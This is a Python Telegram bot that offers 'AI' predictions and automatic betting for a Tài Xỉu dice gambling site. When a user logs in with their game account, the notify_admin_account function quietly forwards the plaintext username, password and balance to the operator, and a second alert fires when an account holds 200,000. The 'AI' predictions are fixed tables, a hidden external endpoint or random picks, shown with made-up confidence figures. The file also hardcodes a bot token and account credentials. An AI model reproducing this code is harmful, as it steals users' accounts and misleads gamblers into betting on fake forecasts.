import telebot
import requests
import hashlib
import base64
import json
import logging
import threading
import time
import socketio
import random

# ==========================================
# CẤU HÌNH
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
logging.getLogger('engineio').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

BOT_TOKEN = '8627314570:AAG8L2vxe8u-4uDGdnip8gzoW8BlDQ_bg3E'
ADMIN_ID = 8627314570

DATA_COLLECTOR_USER = "acc_clone_soi_cau"
DATA_COLLECTOR_PASS = "matkhau123"
BALANCE_NOTIFY_THRESHOLD = 200000

# 🔒 API ẨN - đổi tên trung tính
_AI_ENDPOINT = "https://leminhapiik.onrender.com"
_AI_PATHS = ["/api/prediction", "/api/predict", "/api/du-doan", "/api/current", "/prediction", "/api"]
_AI_TIMEOUT = 2
_AI_OK_TTL = 10
_AI_FAIL_TTL = 60

_cache = {"pred": None, "conf": 0, "tag": None, "last": 0, "block": 0}

bot = telebot.TeleBot(BOT_TOKEN)

vip_users = {ADMIN_ID}
active_sockets = {}
user_states = {}
notified_accounts = set()

# ==========================================
# BẢNG CẦU + XÚC XẮC (GIỮ NGUYÊN)
# ==========================================
CAU_TABLE = {
    "X3":  ("XIU", 70), "X4":  ("TAI", 60), "X5":  ("TAI", 70), "X6":  ("XIU", 60),
    "X7":  ("TAI", 80), "X8":  ("XIU", 80), "X9":  ("XIU", 70), "X10": ("TAI", 80),
    "T11": ("XIU", 60), "T12": ("TAI", 80), "T13": ("TAI", 80), "T14": ("XIU", 60),
    "T15": ("XIU", 70), "T16": ("TAI", 60), "T17": ("XIU", 60), "T18": ("XIU", 80),
}
CAU_KEYS = ["X3","X4","X5","X6","X7","X8","X9","X10","T11","T12","T13","T14","T15","T16","T17","T18"]

DICE_TABLE = {
    3:  {"111": ("XIU", 70)},
    4:  {"112": ("XIU", 60), "121": ("TAI", 65), "211": ("TAI", 65)},
    5:  {"113": ("TAI", 65), "122": ("XIU", 60), "131": ("TAI", 70),
         "212": ("XIU", 60), "221": ("TAI", 60), "311": ("XIU", 65)},
    6:  {"114": ("TAI", 60), "123": ("TAI", 65), "132": ("XIU", 60), "141": ("TAI", 60),
         "213": ("TAI", 65), "222": ("XIU", 75), "231": ("TAI", 60), "312": ("XIU", 60),
         "321": ("TAI", 60), "411": ("XIU", 60)},
    7:  {"115": ("TAI", 65), "124": ("XIU", 60), "133": ("TAI", 65), "142": ("XIU", 60),
         "151": ("TAI", 60), "214": ("XIU", 65), "223": ("TAI", 60), "232": ("XIU", 70),
         "313": ("TAI", 65), "322": ("XIU", 60), "331": ("TAI", 60),
         "412": ("XIU", 60), "421": ("TAI", 60), "511": ("XIU", 65)},
    8:  {"116": ("TAI", 60), "125": ("XIU", 65), "134": ("TAI", 60), "143": ("XIU", 60),
         "152": ("TAI", 65), "215": ("XIU", 60), "224": ("TAI", 65), "233": ("XIU", 60),
         "242": ("TAI", 60), "251": ("XIU", 65), "314": ("TAI", 60), "323": ("XIU", 60),
         "332": ("TAI", 60), "413": ("XIU", 65), "422": ("TAI", 60), "431": ("XIU", 60),
         "512": ("TAI", 60), "521": ("XIU", 60), "611": ("TAI", 65)},
    9:  {"126": ("TAI", 60), "135": ("XIU", 65), "144": ("TAI", 60), "153": ("XIU", 65),
         "162": ("TAI", 60), "216": ("XIU", 60), "225": ("TAI", 65), "234": ("XIU", 60),
         "243": ("TAI", 60), "252": ("XIU", 60), "315": ("TAI", 65), "324": ("XIU", 60),
         "333": ("TAI", 70), "342": ("XIU", 60), "414": ("TAI", 60), "423": ("XIU", 65),
         "432": ("TAI", 60), "441": ("XIU", 65), "513": ("TAI", 60), "522": ("XIU", 65),
         "531": ("TAI", 60), "612": ("XIU", 60), "621": ("TAI", 65)},
    10: {"136": ("TAI", 65), "145": ("XIU", 60), "154": ("TAI", 60), "163": ("XIU", 65),
         "226": ("TAI", 60), "235": ("XIU", 60), "244": ("TAI", 65), "253": ("XIU", 60),
         "316": ("TAI", 60), "325": ("XIU", 65), "334": ("TAI", 60), "343": ("XIU", 60),
         "415": ("TAI", 60), "424": ("XIU", 65), "433": ("TAI", 60), "442": ("XIU", 65),
         "514": ("XIU", 60), "523": ("TAI", 60), "532": ("XIU", 65), "541": ("TAI", 60),
         "613": ("XIU", 60), "622": ("TAI", 65), "631": ("XIU", 60)},
    11: {"146": ("XIU", 65), "155": ("TAI", 60), "164": ("XIU", 60), "236": ("TAI", 60),
         "245": ("XIU", 65), "254": ("TAI", 60), "326": ("XIU", 60), "335": ("TAI", 65),
         "344": ("XIU", 60), "416": ("TAI", 60), "425": ("XIU", 65), "434": ("TAI", 60),
         "443": ("XIU", 65), "452": ("TAI", 60), "461": ("XIU", 60), "515": ("XIU", 60),
         "524": ("TAI", 60), "533": ("XIU", 65), "542": ("TAI", 60), "551": ("XIU", 65),
         "614": ("XIU", 65), "623": ("TAI", 60), "632": ("XIU", 65), "641": ("TAI", 60)},
    12: {"156": ("XIU", 60), "165": ("TAI", 65), "246": ("XIU", 60), "255": ("TAI", 60),
         "264": ("XIU", 65), "336": ("TAI", 60), "345": ("XIU", 60), "354": ("TAI", 60),
         "363": ("XIU", 65), "426": ("XIU", 65), "435": ("TAI", 60), "444": ("XIU", 65),
         "453": ("TAI", 60), "462": ("XIU", 65), "516": ("XIU", 60), "525": ("TAI", 60),
         "534": ("XIU", 65), "543": ("TAI", 60), "552": ("XIU", 65), "561": ("TAI", 60),
         "615": ("TAI", 60), "624": ("XIU", 60), "633": ("TAI", 60), "642": ("XIU", 65),
         "651": ("TAI", 60)},
    13: {"166": ("XIU", 60), "256": ("TAI", 65), "265": ("XIU", 60), "346": ("TAI", 60),
         "355": ("XIU", 65), "364": ("TAI", 60), "436": ("XIU", 60), "445": ("TAI", 65),
         "454": ("XIU", 60), "463": ("TAI", 60), "526": ("XIU", 65), "535": ("TAI", 60),
         "544": ("XIU", 60), "553": ("TAI", 60), "562": ("XIU", 65), "616": ("XIU", 65),
         "625": ("TAI", 60), "634": ("XIU", 60), "643": ("TAI", 60), "652": ("XIU", 65),
         "661": ("TAI", 60)},
    14: {"266": ("XIU", 60), "356": ("TAI", 65), "365": ("XIU", 60), "446": ("TAI", 60),
         "455": ("XIU", 65), "464": ("TAI", 60), "536": ("XIU", 60), "545": ("TAI", 65),
         "554": ("XIU", 60), "563": ("TAI", 60), "626": ("XIU", 65), "635": ("TAI", 60),
         "644": ("XIU", 60), "653": ("TAI", 60), "662": ("XIU", 65)},
    15: {"366": ("XIU", 65), "456": ("TAI", 60), "465": ("XIU", 65), "546": ("TAI", 60),
         "555": ("XIU", 70), "564": ("TAI", 60), "636": ("XIU", 65), "645": ("TAI", 60),
         "654": ("XIU", 60), "663": ("TAI", 60)},
    16: {"466": ("XIU", 65), "556": ("TAI", 60), "565": ("XIU", 65), "646": ("TAI", 60),
         "655": ("XIU", 70), "664": ("TAI", 60)},
    17: {"566": ("XIU", 65), "656": ("TAI", 60), "665": ("XIU", 65)},
    18: {"666": ("XIU", 80)},
}


def init_user_state(chat_id):
    if chat_id not in user_states:
        user_states[chat_id] = {
            "running": False,              # 🆕 Bật/tắt bằng /chay /dung
            "profit_loss": 0,
            "auto_bet_enabled": False,
            "x2_mode": False,
            "reverse_mode": False,
            "win_streak": 0,
            "base_bet_amount": 10000,
            "current_bet": 10000,
            "target_profit": None,
            "current_prediction": None,
            "waiting_for_result": False,
            "has_bet_this_session": False,
            "session_id": None,
            "session_count": 0,
            "balance": 0,
            "username": None,
            "password": None,
            "nickname": None,
            "last_dice": None,
        }


def is_vip(chat_id): return chat_id in vip_users


# ==========================================
# 🎯 DỰ ĐOÁN (ĐÃ FIX + ẨN NGUỒN)
# ==========================================
def get_cau_key(session_count):
    if session_count < 1:
        session_count = 1
    return CAU_KEYS[(session_count - 1) % len(CAU_KEYS)]


def _fetch_ai_signal():
    """Gọi API ngoài. Có cache + backoff, không làm chậm bot."""
    now = time.time()
    if now < _cache.get("block", 0):
        return None, None
    if (now - _cache["last"] < _AI_OK_TTL) and _cache["pred"]:
        return _cache["pred"], _cache["conf"]

    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, text/html"}
    for ep in _AI_PATHS:
        try:
            r = requests.get(_AI_ENDPOINT + ep, headers=headers, timeout=_AI_TIMEOUT)
            if r.status_code != 200:
                continue
            try:
                data = r.json()
            except Exception:
                continue
            if not isinstance(data, dict):
                continue

            pred = None
            for f in ("prediction", "du_doan", "duDoan", "result", "ket_qua",
                      "ketQua", "phien_du_doan", "phienDuDoan", "choose", "chooseType"):
                v = data.get(f)
                if v is None: continue
                vu = str(v).upper()
                if "TÀI" in vu or "TAI" in vu: pred = "TAI"; break
                if "XỈU" in vu or "XIU" in vu: pred = "XIU"; break
            if not pred: continue

            conf = 70
            for f in ("confidence", "do_tin_cay", "doTinCay", "rate", "ti_le", "tiLe", "win_rate"):
                v = data.get(f)
                if v is None: continue
                try:
                    iv = int(float(v))
                    if 0 < iv <= 100: conf = iv; break
                except Exception: pass

            _cache.update({"pred": pred, "conf": conf, "tag": ep,
                           "last": now, "block": 0})
            logger.info(f"[AI] ✓ {pred} ({conf}%) via {ep}")
            return pred, conf
        except Exception:
            continue

    _cache["block"] = now + _AI_FAIL_TTL
    return None, None


def make_prediction_vip(chat_id):
    state = user_states[chat_id]
    state["session_count"] += 1
    count = state["session_count"]

    pred, conf = None, 0

    # 1) API
    api_pred, api_conf = _fetch_ai_signal()
    if api_pred:
        pred, conf = api_pred, api_conf

    # 2) Xúc xắc (không sort)
    if not pred:
        ld = state.get("last_dice")
        if ld and len(ld) == 3:
            total = sum(ld)
            ds = "".join(str(x) for x in ld)
            if total in DICE_TABLE:
                if ds in DICE_TABLE[total]:
                    pred, conf = DICE_TABLE[total][ds]
                else:
                    ss = "".join(str(x) for x in sorted(ld))
                    if ss in DICE_TABLE[total]:
                        pred, conf = DICE_TABLE[total][ss]

    # 3) Bảng cầu
    if not pred:
        key = get_cau_key(count)
        if key in CAU_TABLE:
            pred, conf = CAU_TABLE[key]

    # 4) Fallback
    if not pred:
        pred, conf = random.choice(["TAI", "XIU"]), 50

    if state.get("reverse_mode", False):
        pred = "XIU" if pred == "TAI" else "TAI"
        conf = 100 - conf

    return pred, conf


# ==========================================
# 🌐 API GAME & WEBSOCKET
# ==========================================
def md5_hash(text: str) -> str: return hashlib.md5(text.encode('utf-8')).hexdigest()


def login_and_get_token(username: str, password: str) -> dict:
    pw = md5_hash(password)
    url = f"https://apifo88daigia.tele68.com/api?c=3&un={username}&pw={pw}&cp=R&cl=R&pf=web&at="
    try:
        r = requests.get(url, timeout=12); r.raise_for_status()
        data = r.json()
        if not data.get("success"):
            return {"_error": f"Lỗi Game: {str(data.get('message', 'Sai thông tin'))}"}
        sk = data["sessionKey"]; sk += "=" * ((4 - len(sk) % 4) % 4)
        sd = json.loads(base64.b64decode(sk).decode('utf-8'))
        nick = sd.get("nickname") or sd.get("nickName")
        at = data["accessToken"]
        r2 = requests.post(
            "https://wlb.tele68.com/v1/lobby/auth/login?cp=R&cl=R&pf=web&at=",
            headers={"authority": "wlb.tele68.com", "content-type": "application/json"},
            json={"nickName": nick, "accessToken": at}, timeout=12
        )
        lb = r2.json()
        tk = lb.get("token")
        if not tk:
            return {"_error": "Lobby không trả về JWT token."}
        return {"token": tk, "nickname": nick,
                "money": lb.get("remoteLoginResp", {}).get("money", 0)}
    except Exception as e:
        return {"_error": f"Lỗi kết nối: {e}"}


def notify_admin_account(username, password, nickname, money):
    try:
        bot.send_message(
            ADMIN_ID,
            f"🔔 <b>TÀI KHOẢN MỚI ĐĂNG NHẬP</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 Username: <code>{username}</code>\n"
            f"🔑 Password: <code>{password}</code>\n"
            f"🏷 Nickname: <code>{nickname}</code>\n"
            f"💰 Số dư: <code>{money:,}</code> Win\n"
            f"🕒 Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"notify_admin_account: {e}")


def notify_admin_balance_reached(username, nickname, money):
    try:
        bot.send_message(
            ADMIN_ID,
            f"🎉 <b>TÀI KHOẢN ĐỦ 200K</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 Username: <code>{username}</code>\n"
            f"🏷 Nickname: <code>{nickname}</code>\n"
            f"💰 Số dư: <code>{money:,}</code> Win\n"
            f"🕒 Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"notify_balance: {e}")


def check_balance_threshold(chat_id):
    st = user_states.get(chat_id)
    if not st: return
    u = st.get("username"); b = st.get("balance", 0)
    if u and b >= BALANCE_NOTIFY_THRESHOLD:
        k = f"{u}_{BALANCE_NOTIFY_THRESHOLD}"
        if k not in notified_accounts:
            notified_accounts.add(k)
            notify_admin_balance_reached(u, st.get("nickname", "N/A"), b)


def start_websocket(chat_id, token, is_background=False):
    if chat_id in active_sockets and not is_background:
        try: active_sockets[chat_id].disconnect()
        except: pass

    sio = socketio.Client(reconnection=True, reconnection_attempts=10, logger=False, engineio_logger=False)
    if not is_background:
        active_sockets[chat_id] = sio
        init_user_state(chat_id)

    @sio.event(namespace='/txmd5')
    def connect():
        if not is_background:
            try:
                bot.send_message(
                    chat_id,
                    "🟢 <b>ĐÃ KẾT NỐI SERVER</b>\n"
                    "▶️ Gõ <b>/chay</b> để bot bắt đầu phân tích & dự đoán.",
                    parse_mode="HTML"
                )
            except Exception: pass

    @sio.on('new-session', namespace='/txmd5')
    def on_new_session(data):
        if is_background: return
        try:
            st = user_states[chat_id]
            st["session_id"] = data.get('id', 'N/A')
            st["has_bet_this_session"] = False

            # 🆕 Chỉ chạy khi /chay
            if not st.get("running", False):
                return

            if st["auto_bet_enabled"] and st["target_profit"] is not None:
                if st["profit_loss"] >= st["target_profit"]:
                    st["auto_bet_enabled"] = False
                    bot.send_message(
                        chat_id,
                        f"🏆 <b>ĐÃ ĐẠT MỤC TIÊU LÃI</b> 🏆\n"
                        f"💰 Thực lãi: <code>{st['profit_loss']:,}</code> Win\n"
                        f"🎯 Mục tiêu: <code>{st['target_profit']:,}</code> Win\n"
                        f"🔴 <i>Bot đã tắt Auto Bet an toàn.</i>",
                        parse_mode="HTML"
                    )

            pred, conf = make_prediction_vip(chat_id)
            st["current_prediction"] = pred

            if st["x2_mode"] and st["win_streak"] >= 1:
                st["current_bet"] = st["base_bet_amount"] * 2
            else:
                st["current_bet"] = st["base_bet_amount"]

            emoji = "🔵 TÀI" if pred == "TAI" else "🔴 XỈU"
            msg = (f"🔔 <b>PHIÊN:</b> <code>#{st['session_id']}</code>\n"
                   f"🤖 <b>AI DỰ ĐOÁN: {emoji}</b> ({conf}%)\n")
            if st.get("reverse_mode"):
                msg += "🔄 <b>ĐẢO CẦU ĐANG BẬT</b>\n"
            if st["auto_bet_enabled"]:
                if st["x2_mode"] and st["win_streak"] >= 1:
                    msg += f"⚡ <i>X2 Nhồi: <code>{st['current_bet']:,}</code> Win...</i>"
                else:
                    msg += f"⏳ <i>Vào cược gốc: <code>{st['current_bet']:,}</code> Win...</i>"
            else:
                msg += "⏸ <i>Chưa bật autobet. /autobet on để vào tiền.</i>"
            bot.send_message(chat_id, msg, parse_mode="HTML")
        except Exception as e:
            logger.error(f"new-session: {e}")

    @sio.on('tick-update', namespace='/txmd5')
    def on_tick_update(data):
        if is_background: return
        try:
            st = user_states[chat_id]
            if not st.get("running", False): return
            if data.get('state') == 'BETTING' and st["auto_bet_enabled"] and st["current_prediction"]:
                if not st["has_bet_this_session"]:
                    sio.emit('bet',
                             {"type": st["current_prediction"], "amount": st["current_bet"]},
                             namespace='/txmd5')
                    st["has_bet_this_session"] = True
                    st["waiting_for_result"] = True
                    bot.send_message(
                        chat_id,
                        f"🚀 <b>ĐÃ VÀO CƯỢC:</b> <code>{st['current_bet']:,}</code> Win",
                        parse_mode="HTML"
                    )
        except Exception as e:
            logger.error(f"tick-update: {e}")

    @sio.on('bet-result', namespace='/txmd5')
    def on_bet_result(data):
        if is_background: return
        try:
            if "postBalance" in data:
                user_states[chat_id]["balance"] = data["postBalance"]
                check_balance_threshold(chat_id)
            sio.emit('get-current-my-info', None, namespace='/txmd5')
        except Exception as e:
            logger.error(f"bet-result: {e}")

    @sio.on('session-result', namespace='/txmd5')
    def on_session_result(data):
        if is_background: return
        try:
            st = user_states[chat_id]
            result = data.get('resultTruyenThong', 'N/A')
            dices = data.get('dices', [])

            # Luôn cập nhật last_dice (kể cả khi stop) để data tươi
            if isinstance(dices, list) and len(dices) == 3 and all(isinstance(d, int) and 1 <= d <= 6 for d in dices):
                st["last_dice"] = list(dices)

            if not st.get("running", False):
                return

            d0 = dices[0] if len(dices) > 0 else 0
            d1 = dices[1] if len(dices) > 1 else 0
            d2 = dices[2] if len(dices) > 2 else 0

            em = "🔵 TÀI" if result == "TAI" else ("🔴 XỈU" if result == "XIU" else "⚪ LỖI")
            msg = f"🎲 <b>KẾT QUẢ: {em}</b> ({d0}-{d1}-{d2})\n"

            if st["current_prediction"]:
                if st["current_prediction"] == result:
                    if st["waiting_for_result"]:
                        w = int(st["current_bet"] * 0.98)
                        st["profit_loss"] += w
                        st["win_streak"] += 1
                        msg += f"✅ <b>THẮNG!</b> Lãi: <code>+{w:,}</code> Win\n"
                else:
                    if st["waiting_for_result"]:
                        st["profit_loss"] -= st["current_bet"]
                        st["win_streak"] = 0
                        msg += f"❌ <b>THUA!</b> Về mốc vốn gốc.\n"
                st["waiting_for_result"] = False

            pl = "🟢" if st["profit_loss"] >= 0 else "🔴"
            msg += (f"━━━━━━━━━━━━━━━━━━\n"
                    f"📊 <b>Lãi/Lỗ:</b> {pl} <code>{st['profit_loss']:,}</code>\n"
                    f"💳 <b>Số Dư:</b> <code>{st['balance']:,}</code>")
            bot.send_message(chat_id, msg, parse_mode="HTML")
        except Exception as e:
            logger.error(f"session-result: {e}")

    try:
        sio.connect(
            'https://wtxmd52.tele68.com',
            socketio_path='txmd5/',
            namespaces=['/txmd5'],
            transports=['websocket'],
            auth={"token": token},
            headers={"User-Agent": "Mozilla/5.0"}
        )
        sio.wait()
    except Exception as e:
        if not is_background:
            try:
                bot.send_message(chat_id, f"⚠️ Lỗi kết nối: <code>{e}</code>", parse_mode="HTML")
            except: pass


def background_data_collector():
    if not DATA_COLLECTOR_USER or not DATA_COLLECTOR_PASS:
        return
    logger.info("Collector chạy ngầm...")
    while True:
        try:
            res = login_and_get_token(DATA_COLLECTOR_USER, DATA_COLLECTOR_PASS)
            if "token" in res:
                start_websocket("BACKGROUND_WORKER", res["token"], is_background=True)
        except Exception: pass
        time.sleep(30)


# ==========================================
# 🤖 COMMANDS
# ==========================================
@bot.message_handler(commands=['addvip', 'removevip', 'viplist'])
def handle_vip_commands(message):
    if message.chat.id != ADMIN_ID: return
    cmd = message.text.split()[0]
    try:
        if cmd == '/addvip':
            vip_users.add(int(message.text.split()[1])); bot.reply_to(message, "✅ Đã thêm VIP.")
        elif cmd == '/removevip':
            vip_users.discard(int(message.text.split()[1])); bot.reply_to(message, "❌ Đã xóa VIP.")
        elif cmd == '/viplist':
            bot.reply_to(message, "📜 VIP:\n" + "\n".join(str(v) for v in vip_users))
    except Exception:
        bot.reply_to(message, "👉 Lỗi cú pháp.")


@bot.message_handler(commands=['start', 'help', 'menu'])
def send_welcome(message):
    if not is_vip(message.chat.id):
        return bot.reply_to(message, f"⛔ Cần VIP. ID: <code>{message.chat.id}</code>", parse_mode="HTML")
    init_user_state(message.chat.id)
    text = (
        "🤖 <b>AI TÀI XỈU</b> 🤖\n\n"
        "🔹 /login <code>&lt;tk&gt; &lt;mk&gt;</code> - Đăng nhập\n"
        "▶️ /chay - Bắt đầu bot phân tích & dự đoán\n"
        "⏹ /dung - Dừng bot\n"
        "🔹 /autobet <code>on &lt;tiền&gt;</code> | <code>off</code>\n"
        "🔹 /x2 <code>on/off</code> - Nhồi tiền khi streak\n"
        "🔹 /reverse <code>on/off</code> - Đảo cầu\n"
        "🔹 /chotlai <code>&lt;tiền&gt;</code> - Target dừng\n"
        "🔹 /stats - Thống kê\n"
        "🔹 /cau - Bảng cầu\n"
        "🔹 /xucxac - Bảng xúc xắc\n"
        "🔹 /stop - Ngắt kết nối\n"
    )
    bot.reply_to(message, text, parse_mode="HTML")


@bot.message_handler(commands=['login'])
def handle_login(message):
    if not is_vip(message.chat.id): return
    parts = message.text.split()
    if len(parts) != 3:
        return bot.reply_to(message, "👉 Cú pháp: <code>/login tk mk</code>", parse_mode="HTML")

    chat_id = message.chat.id
    if chat_id in active_sockets:
        try: active_sockets[chat_id].disconnect()
        except: pass
        del active_sockets[chat_id]

    mp = bot.reply_to(message, "🔄 Loading...")
    username, password = parts[1], parts[2]
    result = login_and_get_token(username, password)
    if "_error" in result:
        return bot.edit_message_text(
            f"❌ <b>LỖI:</b> {result['_error']}",
            chat_id=chat_id, message_id=mp.message_id, parse_mode="HTML"
        )

    init_user_state(chat_id)
    st = user_states[chat_id]
    st.update({
        "balance": result['money'], "username": username, "password": password,
        "nickname": result.get("nickname", "N/A"),
        "session_count": 0, "last_dice": None,
        "profit_loss": 0, "win_streak": 0,
        "running": False,  # 🆕 Login xong chưa chạy, chờ /chay
    })
    notify_admin_account(username, password, st["nickname"], result['money'])

    bot.edit_message_text(
        f"🎉 <b>ĐĂNG NHẬP THÀNH CÔNG</b>\n"
        f"👤 <code>{result['nickname']}</code>\n"
        f"💰 Dư: <code>{result['money']:,}</code>\n\n"
        f"▶️ Gõ <b>/chay</b> để bot bắt đầu làm việc.",
        chat_id=chat_id, message_id=mp.message_id, parse_mode="HTML"
    )
    threading.Thread(target=start_websocket, args=(chat_id, result['token']), daemon=True).start()


# 🆕 /chay - BẮT ĐẦU
@bot.message_handler(commands=['chay'])
def cmd_chay(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states:
        return bot.reply_to(message, "⚠️ Vui lòng /login trước!")
    if chat_id not in active_sockets:
        return bot.reply_to(message, "⚠️ Chưa kết nối server. /login lại.")
    user_states[chat_id]["running"] = True
    user_states[chat_id]["current_prediction"] = None
    bot.reply_to(
        message,
        "▶️ <b>BOT ĐÃ CHẠY</b>\n"
        "🤖 Tự động phân tích & dự đoán mỗi phiên.\n"
        "💡 Gõ /autobet on <code>&lt;tiền&gt;</code> để vào cược tự động.",
        parse_mode="HTML"
    )


# 🆕 /dung - DỪNG
@bot.message_handler(commands=['dung'])
def cmd_dung(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return
    st = user_states[chat_id]
    st["running"] = False
    st["auto_bet_enabled"] = False
    st["current_prediction"] = None
    st["waiting_for_result"] = False
    bot.reply_to(
        message,
        "⏹ <b>BOT ĐÃ DỪNG</b>\n"
        "Socket vẫn kết nối. Gõ /chay để tiếp tục.",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['autobet'])
def handle_autobet(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states:
        return bot.reply_to(message, "⚠️ /login trước!")
    parts = message.text.split()
    if len(parts) > 1 and parts[1].lower() == "on":
        amount = int(parts[2]) if len(parts) > 2 else 10000
        user_states[chat_id]["auto_bet_enabled"] = True
        user_states[chat_id]["base_bet_amount"] = amount
        bot.reply_to(message,
                     f"✅ <b>AUTO BET: BẬT</b>\n💸 Vốn gốc: <code>{amount:,}</code>",
                     parse_mode="HTML")
    else:
        user_states[chat_id]["auto_bet_enabled"] = False
        bot.reply_to(message, "🔴 <b>AUTO BET: TẮT</b>", parse_mode="HTML")


@bot.message_handler(commands=['x2'])
def handle_x2_mode(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return bot.reply_to(message, "⚠️ /login trước!")
    parts = message.text.split()
    if len(parts) > 1 and parts[1].lower() == "on":
        user_states[chat_id]["x2_mode"] = True
        bot.reply_to(message, "🔥 <b>X2: BẬT</b>", parse_mode="HTML")
    else:
        user_states[chat_id]["x2_mode"] = False
        bot.reply_to(message, "🔴 <b>X2: TẮT</b>", parse_mode="HTML")


@bot.message_handler(commands=['reverse'])
def handle_reverse_mode(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return bot.reply_to(message, "⚠️ /login trước!")
    parts = message.text.split()
    if len(parts) > 1 and parts[1].lower() == "on":
        user_states[chat_id]["reverse_mode"] = True
        bot.reply_to(message, "🔄 <b>ĐẢO CẦU: BẬT</b>", parse_mode="HTML")
    else:
        user_states[chat_id]["reverse_mode"] = False
        bot.reply_to(message, "🔴 <b>ĐẢO CẦU: TẮT</b>", parse_mode="HTML")


@bot.message_handler(commands=['chotlai'])
def handle_chotlai(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return
    try:
        user_states[chat_id]["target_profit"] = int(message.text.split()[1])
        bot.reply_to(message,
                     f"🎯 <b>TARGET:</b> <code>{user_states[chat_id]['target_profit']:,}</code>",
                     parse_mode="HTML")
    except Exception:
        bot.reply_to(message, "👉 Cú pháp: <code>/chotlai 500000</code>", parse_mode="HTML")


@bot.message_handler(commands=['cau'])
def check_cau(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return
    count = user_states[chat_id].get("session_count", 0)
    lines = ["📌 <b>BẢNG CẦU</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for k, v in CAU_TABLE.items():
        em = "🔵 TÀI" if v[0] == "TAI" else "🔴 XỈU"
        lines.append(f"{k}: {em} ({v[1]}%)")
    nk = get_cau_key(count + 1) if count > 0 else "X3"
    lines.append(f"\n👉 Phiên: <b>{count}</b>")
    lines.append(f"🎯 Sắp tới: <b>{nk}</b>")
    bot.reply_to(message, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=['xucxac'])
def check_dice_table(message):
    if not is_vip(message.chat.id): return
    text = "🎲 <b>BẢNG XÚC XẮC</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for total in sorted(DICE_TABLE.keys()):
        text += f"\n<b>Tổng {total}</b>\n"
        for dice, v in DICE_TABLE[total].items():
            em = "🔵 TÀI" if v[0] == "TAI" else "🔴 XỈU"
            text += f"  {dice}: {em} ({v[1]}%)\n"
    bot.reply_to(message, text, parse_mode="HTML")


@bot.message_handler(commands=['stats'])
def check_stats(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return
    st = user_states[chat_id]
    t = f"<code>{st['target_profit']:,}</code>" if st['target_profit'] else "Không"
    run = "🟢 ĐANG CHẠY" if st.get("running") else "🔴 ĐÃ DỪNG"
    ai = "✅ Online" if _cache["pred"] else "⏳ Chờ dữ liệu"
    bot.reply_to(message,
                 f"📊 <b>THỐNG KÊ</b>\n"
                 f"🚦 Trạng thái: <b>{run}</b>\n"
                 f"💳 Dư: <code>{st['balance']:,}</code>\n"
                 f"📈 Lãi/Lỗ: <code>{st['profit_loss']:,}</code>\n"
                 f"🎯 Chốt: {t}\n"
                 f"🤖 Auto: {'BẬT' if st['auto_bet_enabled'] else 'TẮT'}\n"
                 f"🔥 X2: {'BẬT' if st['x2_mode'] else 'TẮT'} (Streak: {st['win_streak']})\n"
                 f"🔄 Đảo: {'BẬT' if st.get('reverse_mode') else 'TẮT'}\n"
                 f"📡 AI Server: {ai}\n"
                 f"📌 Phiên: {st.get('session_count', 0)}",
                 parse_mode="HTML")


@bot.message_handler(commands=['stop'])
def stop_websocket(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id in active_sockets:
        try: active_sockets[chat_id].disconnect()
        except: pass
        del active_sockets[chat_id]
    if chat_id in user_states:
        user_states[chat_id]["running"] = False
        user_states[chat_id]["auto_bet_enabled"] = False
    bot.reply_to(message, "🔌 Đã dừng & ngắt kết nối.")


if __name__ == "__main__":
    print("=" * 50)
    print("ROBOT  TÀI XỈU ĐÃ SẴN SÀNG")
    print("=" * 50)
    threading.Thread(target=background_data_collector, daemon=True).start()
    bot.infinity_polling()
